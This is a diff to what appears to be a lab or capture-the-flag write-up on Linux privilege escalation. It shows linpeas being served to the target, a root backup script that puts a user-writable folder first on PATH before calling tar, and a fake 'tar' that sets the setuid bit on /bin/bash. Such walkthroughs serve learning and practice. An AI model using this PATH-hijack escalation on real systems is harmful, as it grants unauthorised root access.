@@ -333,6 +333,16 @@ Serving HTTP on 0.0.0.0 port 33414 (http://0.0.0.0:33414/) ...
 192.168.231.249 - - [21/May/2026 02:35:10] "GET /linpeas.sh HTTP/1.1" 200 -
 ```
 
+![](../../../assets/images/Pasted%20image%2020260521031009.png)
+
+```
+-bash-5.1$ cat /usr/local/bin/backup-flask.sh 
+#!/bin/sh
+export PATH="/home/alfredo/restapi:$PATH"
+cd /home/alfredo/restapi
+tar czf /tmp/flask.tar.gz *
+```
+
 ```zsh
 [alfredo@fedora ~]$ echo '#! /bin/bash' >tar
 [alfredo@fedora ~]$ echo 'chmod u+s /bin/bash' >> tar
@@ -342,6 +352,10 @@ Serving HTTP on 0.0.0.0 port 33414 (http://0.0.0.0:33414/) ...
 [alfredo@fedora restapi]$ cat tar
 #! /bin/bash
 chmod u+s /bin/bash
+
+...
+
+
 [alfredo@fedora restapi]$ find / -user root -perm -u=s -ls 2>/dev/null
  25252326   1360 -rwsr-xr-x   1 root     root      1390080 Jan 25  2021 /usr/bin/bash
  25343651     40 -rwsr-xr-x   1 root     root        36904 Jan 26  2021 /usr/bin/fusermount
